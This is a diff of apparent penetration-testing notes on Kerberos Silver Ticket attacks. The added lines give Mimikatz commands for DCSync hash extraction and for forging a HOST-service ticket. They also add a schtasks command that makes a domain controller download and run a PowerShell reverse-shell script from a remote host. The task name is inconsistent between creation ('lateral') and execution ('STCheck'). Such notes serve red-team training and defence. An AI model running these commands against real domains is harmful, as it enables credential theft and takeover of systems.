@@ -5,6 +5,13 @@ This allows unauthorized access to the service by forging a customized TGS witho
 
 **Required:&#x20;**<mark style="color:purple;">**Service account obtained and**</mark> [<mark style="color:purple;">**PtH**</mark>](../ad-lateral-movement/pass-the-hash.md) <mark style="color:purple;">**session**</mark>
 
+Requirements:
+
+* Domain SID
+* Service account / Machine Account hash
+* Domain name
+* SIDS (in Cross-Forest Attacks)
+
 #### Methodology:
 
 * Get Domain Info
@@ -46,9 +53,13 @@ Invoke-Mimikatz -Command '"lsadump::lsa /inject"' -Computername $TARGET_NAME.loc
 ```
 {% endcode %}
 
+Or extract it with DCSync attack
+
+```powershell
+Invoke-Mimikatz -Command '"lsadump::dcsync /user:DOMAIN\dc-01$"'
+```
+
 <figure><img src="../../../.gitbook/assets/image (111).png" alt="" width="563"><figcaption></figcaption></figure>
-
-
 
 ## Forge Silver Ticket
 
@@ -108,11 +119,33 @@ psexec.py $DOMAIN.local/$Administrator@$TARGET_NAME -target-ip $TARGET_IP
 
 
 
+## Schedule and Execute a task on Remote Server
 
+Adversaries create a silver ticket for HOST service which allows them to schedule a malicious\
+task on the target.
 
+{% code overflow="wrap" %}
+```powershell
+Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:DOMAIN.com /sid:S-1-
+5-21-xxxxxx-yyyy-zzzzz /target:$DC_NAME.$DOMAIN.com /service:$HOST /rc4:xxxxx /id:500
+/groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'
+```
+{% endcode %}
 
+And now, create a schedule to execute a task on remote server
 
+{% code overflow="wrap" %}
+```powershell
+schtasks /create /S $DC_NAME.$DOMAIN.com /SC Weekly /RU "NT Authority\SYSTEM" /TN “lateral" /TR
+"powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://10.10.10.1:8000/InvokePowerShellTcp.ps1''')'"
+```
+{% endcode %}
 
+Check the  schedule
+
+```powershell
+schtasks /Run /S $DC_NAME.$DOMAIN.com /TN "STCheck" 
+```
 
 
 
